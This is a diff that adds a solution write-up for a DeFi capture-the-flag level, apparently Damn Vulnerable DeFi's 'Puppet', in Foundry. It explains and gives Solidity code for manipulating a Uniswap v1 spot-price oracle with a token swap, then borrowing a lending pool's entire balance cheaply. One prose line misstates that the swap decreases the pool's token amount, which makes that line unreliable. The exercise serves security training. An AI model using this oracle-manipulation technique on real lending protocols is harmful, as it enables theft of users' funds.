@@ -488,14 +488,45 @@ function attack(Vm vm) public {
 To beat this level, we need to comply with
 
 ```solidity
+// In the challenge written in hardhat we checked that the
+// attacker did everything in one single transaction.
+// we omit this check in forge.
 
+// player has taken all tokens from the pool
+assertEq(token.balanceOf(address(lendingPool)), 0);
+assertEq(token.balanceOf(msg.sender), POOL_INITIAL_TOKEN_BALANCE);
 ```
+
+In forge, save few exceptions, we do the attacks in a single transaction.
 
 ### Solution
 
-???
+We need to find a way to borrow cheap the 100_000 tokens, notice that the price used in the loan is computed with
+
+```solidity
+function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
+}
+
+function _computeOraclePrice() private view returns (uint256) {
+    // calculates the price of the token in wei according to Uniswap pair
+    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+}
+```
+
+By decreasing the amount of ETH and decreasing the amount of DVT in the uniswap exchange, we can lower the oracle price. As we have 1_000 DVTs we can engage in a swap of DVT for ETH with `tokenToEthSwapInput()`. We will then, have the required amount of ETH to be able to borrow the DVT from the pool and beat the level.
+
+```solidity
+token.approve(address(uniswapExchange), 1000e18);
+uniswapExchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);
+
+lendingPool.borrow
+  {value: lendingPool.calculateDepositRequired(100_000e18)}
+    (100_000e18, address(this));
+```
 
 ### References
 
 * https://docs.uniswap.org/contracts/v1/overview
-* https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy#L99-L111
+* https://docs.uniswap.org/contracts/v1/reference/interfaces
+* https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy
